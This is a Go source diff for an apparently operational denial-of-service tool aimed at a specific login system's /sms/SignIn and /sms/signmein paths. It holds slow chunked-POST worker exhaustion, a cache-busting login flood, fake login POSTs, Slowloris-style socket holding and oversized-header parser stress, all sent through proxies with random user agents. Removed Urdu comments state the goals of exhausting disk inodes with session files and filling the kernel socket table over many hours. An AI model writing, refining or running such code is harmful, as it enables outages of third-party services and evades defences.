@@ -12,15 +12,14 @@ import (
 )
 
 // ============================================================
-// LAYER 1: SLOW CHUNKED POST (PHP-FPM WORKER EXHAUSTION)
+// LAYER 1: SLOW CHUNKED POST
 // ============================================================
 func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClient()
 	client.Timeout = 0
 
-	baseURL := strings.TrimRight(o.target.String(), "/")
-	targetURL := baseURL + "/sms/signmein"
-	refererURL := baseURL + "/sms/SignIn"
+	targetURL := o.smartPaths.LoginPOST
+	refererURL := o.smartPaths.LoginGET
 	layerIdx := 0
 
 	for {
@@ -82,21 +81,11 @@ func slowLoginBody() io.Reader {
 }
 
 // ============================================================
-// LAYER 2: SLOW SESSION & DISK EXHAUSTION
-// یہ ایک عام صارف کی نقل کرتا ہے:
-// 1. آہستہ آہستہ SignIn صفحہ کھولتا ہے۔
-// 2. ایک طویل تاخیر کرتا ہے۔
-// 3. غلط لاگ ان کی کوشش کرتا ہے۔
-// 4. ہر ریکویسٹ کے ساتھ نیا PHPSESSID بنتا ہے اور سیشن فائل ڈسک پر لکھی جاتی ہے۔
-// مقصد: 24-48 گھنٹوں میں لاکھوں بیکار سیشن فائلیں بنا کر ڈسک inodes ختم کرنا۔
+// LAYER 2: CAPTCHA / LOGIN PAGE FLOOD
 // ============================================================
 func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
-	client := o.proxyMgr.NewClient()
-	client.Timeout = 30 * time.Second // طویل ٹائم آؤٹ، تاکہ سست سرور پر بھی کام کرے
-
-	baseURL := strings.TrimRight(o.target.String(), "/")
-	signInURL := baseURL + "/sms/SignIn"
-	loginURL := baseURL + "/sms/signmein"
+	client := o.proxyMgr.NewClientWithTimeout(10 * time.Second)
+	targetURL := o.smartPaths.LoginGET
 	layerIdx := 1
 
 	for {
@@ -106,17 +95,28 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 		default:
 		}
 
-		// 1. SignIn صفحہ حاصل کریں (سیشن شروع کریں)
-		req, _ := http.NewRequestWithContext(ctx, "GET", signInURL, nil)
-		req.Header.Set("User-Agent", randomUA())
-		req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")
-		resp, err := client.Do(req)
-		o.stats.TotalRequests.Add(1)
-		o.stats.Layers[layerIdx].Requests.Add(1)
+		fullURL := fmt.Sprintf("%s?_=%d&r=%d", targetURL, time.Now().UnixNano(), rand.Int63())
+
+		req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
 		if err != nil {
 			o.stats.FailedRequests.Add(1)
 			o.stats.Layers[layerIdx].Fail.Add(1)
-			time.Sleep(5 * time.Second)
+			continue
+		}
+
+		req.Header.Set("User-Agent", randomUA())
+		req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")
+		req.Header.Set("Connection", "keep-alive")
+		req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+		req.Header.Set("Pragma", "no-cache")
+
+		resp, err := client.Do(req)
+		o.stats.TotalRequests.Add(1)
+		o.stats.Layers[layerIdx].Requests.Add(1)
+
+		if err != nil {
+			o.stats.FailedRequests.Add(1)
+			o.stats.Layers[layerIdx].Fail.Add(1)
 			continue
 		}
 		io.Copy(io.Discard, resp.Body)
@@ -124,55 +124,17 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		// 2. 10-30 سیکنڈ انتظار کریں (کسی عام صارف کی طرح)
-		select {
-		case <-ctx.Done():
-			return ctx.Err()
-		case <-time.After(time.Duration(rand.Intn(20)+10) * time.Second):
-		}
-
-		// 3. غلط لاگ ان کی کوشش کریں (سیشن فائل بنے گی)
-		body := fmt.Sprintf("username=%s&password=%s&capt=%d",
-			randomString(8+rand.Intn(8)),
-			randomString(8+rand.Intn(8)),
-			rand.Intn(20)+1)
-
-		req2, _ := http.NewRequestWithContext(ctx, "POST", loginURL, strings.NewReader(body))
-		req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-		req2.Header.Set("User-Agent", randomUA())
-		req2.Header.Set("Origin", o.target.Scheme+"://"+o.target.Host)
-		req2.Header.Set("Referer", signInURL)
-
-		resp2, err2 := client.Do(req2)
-		o.stats.TotalRequests.Add(1)
-		o.stats.Layers[layerIdx].Requests.Add(1)
-		if err2 != nil {
-			o.stats.FailedRequests.Add(1)
-			o.stats.Layers[layerIdx].Fail.Add(1)
-		} else {
-			io.Copy(io.Discard, resp2.Body)
-			resp2.Body.Close()
-			o.stats.SuccessRequests.Add(1)
-			o.stats.Layers[layerIdx].Success.Add(1)
-		}
-
-		// 4. 30-120 سیکنڈ انتظار کریں (اگلے 'صارف' سے پہلے)
-		select {
-		case <-ctx.Done():
-			return ctx.Err()
-		case <-time.After(time.Duration(rand.Intn(90)+30) * time.Second):
-		}
+		time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
 	}
 }
 
 // ============================================================
-// LAYER 3: FAKE LOGIN POST (STANDARD VOLUME)
+// LAYER 3: FAKE LOGIN POST
 // ============================================================
 func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClientWithTimeout(15 * time.Second)
-	baseURL := strings.TrimRight(o.target.String(), "/")
-	targetURL := baseURL + "/sms/signmein"
-	refererURL := baseURL + "/sms/SignIn"
+	targetURL := o.smartPaths.LoginPOST
+	refererURL := o.smartPaths.LoginGET
 	layerIdx := 2
 
 	for {
@@ -221,10 +183,7 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 }
 
 // ============================================================
-// LAYER 4: SLOW TCP SOCKET EXHAUSTER (طویل المدتی)
-// یہ بہت آہستہ آہستہ TCP کنکشن کھولتا ہے اور انہیں بہت دیر تک کھلا رکھتا ہے۔
-// مقصد: 12-24 گھنٹوں میں ہزاروں TCP ساکٹس کو ESTABLISHED حالت میں کھلا رکھ کر
-// کرنل کی ساکٹ ٹیبل آہستہ آہستہ بھرنا۔
+// LAYER 4: TCP POOL EXHAUST
 // ============================================================
 func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error {
 	layerIdx := 3
@@ -245,15 +204,13 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 		o.stats.TotalRequests.Add(1)
 		o.stats.Layers[layerIdx].Requests.Add(1)
 
-		// ایک جائز لیکن نامکمل HTTP درخواست بھیجیں
 		reqStr := fmt.Sprintf(
-			"GET /sms/SignIn HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n",
-			o.target.Host, randomUA(),
+			"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n",
+			o.smartPaths.LoginGET, o.target.Host, randomUA(),
 		)
 		conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
 		conn.Write([]byte(reqStr))
 
-		// کنکشن کو 60-120 سیکنڈ تک کھلا رکھیں، اور ہر 15 سیکنڈ بعد ایک فضول ہیڈر بھیج دیں۔
 		duration := time.Duration(rand.Intn(60)+60) * time.Second
 		deadline := time.Now().Add(duration)
 		for time.Now().Before(deadline) {
@@ -270,7 +227,6 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		// اگلا کنکشن کھولنے سے پہلے 30-60 سیکنڈ کا طویل وقفہ
 		select {
 		case <-ctx.Done():
 			return ctx.Err()
@@ -280,7 +236,7 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 }
 
 // ============================================================
-// LAYER 5: PARSER STRESS + OVERSIZED HEADERS
+// LAYER 5: PARSER STRESS
 // ============================================================
 var oversizedHeaderNames = []string{
 	"X-Custom-Data", "X-Tracking-ID", "X-Session-Token",
@@ -291,8 +247,7 @@ var oversizedHeaderNames = []string{
 
 func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClientWithTimeout(20 * time.Second)
-	baseURL := strings.TrimRight(o.target.String(), "/")
-	targetURL := baseURL + "/sms/SignIn"
+	targetURL := o.smartPaths.LoginGET
 	layerIdx := 4
 
 	for {
